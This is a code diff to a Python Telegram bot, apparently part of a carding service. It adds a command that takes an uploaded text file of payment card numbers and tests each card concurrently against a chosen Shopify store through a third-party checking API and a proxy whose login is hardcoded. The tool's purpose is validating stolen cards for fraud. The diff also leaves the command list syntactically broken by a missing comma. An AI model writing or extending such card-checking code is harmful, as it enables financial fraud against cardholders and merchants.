@@ -4682,6 +4682,75 @@ async def msite_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 
 
+import aiohttp
+import asyncio
+from telegram import Update, InputFile
+from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes, MessageHandler, filters
+from db import get_user  # fetch user data from DB
+
+PROXY = "198.23.239.134:6540:skgbsgwl:7y2hll5e4ycn"
+
+async def process_cards(update: Update, file_path: str, file_name: str, site: str):
+    output_lines = []
+
+    async with aiohttp.ClientSession() as session:
+        with open(file_path, "r") as f:
+            cards = [line.strip() for line in f if line.strip()]
+
+        # Process cards concurrently (optional: adjust concurrency if needed)
+        sem = asyncio.Semaphore(5)  # limit concurrent requests
+
+        async def check_card(card):
+            async with sem:
+                api_url = f"https://autoshopify-dark.sevalla.app/index.php?site={site}&cc={card}&proxy={PROXY}"
+                try:
+                    async with session.get(api_url) as resp:
+                        data = await resp.json()
+                        response_text = data.get("Response", "No Response")
+                        output_lines.append(f"{card} => {response_text}")
+                except Exception as e:
+                    output_lines.append(f"{card} => Error: {e}")
+
+        await asyncio.gather(*(check_card(card) for card in cards))
+
+    output_file_path = f"results_{file_name}"
+    with open(output_file_path, "w") as f:
+        f.write("\n".join(output_lines))
+
+    # Send the result file back
+    await update.message.reply_document(document=InputFile(output_file_path))
+
+async def mtxt_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    user_data = await get_user(user_id)  # fetch user data from DB
+
+    if not user_data or not user_data.get("custom_urls"):
+        await update.message.reply_text("You have not added any site. Please add your custom site first.")
+        return
+
+    site = user_data["custom_urls"]
+
+    if not update.message.document:
+        await update.message.reply_text("Please reply with a .txt file containing cards.")
+        return
+
+    document = update.message.document
+    if not document.file_name.endswith(".txt"):
+        await update.message.reply_text("Only .txt files are supported.")
+        return
+
+    await update.message.reply_text("✅ Processing started in the background. You will get results when done!")
+
+    file = await document.get_file()
+    file_path = f"./{document.file_name}"
+    await file.download_to_drive(file_path)
+
+    # Run the processing in the background
+    asyncio.create_task(process_cards(update, file_path, document.file_name, site))
+
+
+
+
 # ===== Shopify check request =====
 import asyncio
 import httpx
@@ -4738,7 +4807,7 @@ async def run_msp(update: Update, cards, base_url, sites, msg):
     site_price = None
     gateway_used = "Self Shopify"
     results = []
-    sem = asyncio.Semaphore(6)  # Moderate concurrency
+    sem = asyncio.Semaphore(5)  # Moderate concurrency
     lock = asyncio.Lock()
 
     # Priority map
@@ -6850,6 +6919,8 @@ def register_commands(application):
         ("fl", fl_command),
         ("status", status_command),
         ("redeem", redeem_command)
+        ("mtxt", mtxt_command), 
+
     ]
 
     for cmd_name, cmd_func in commands:
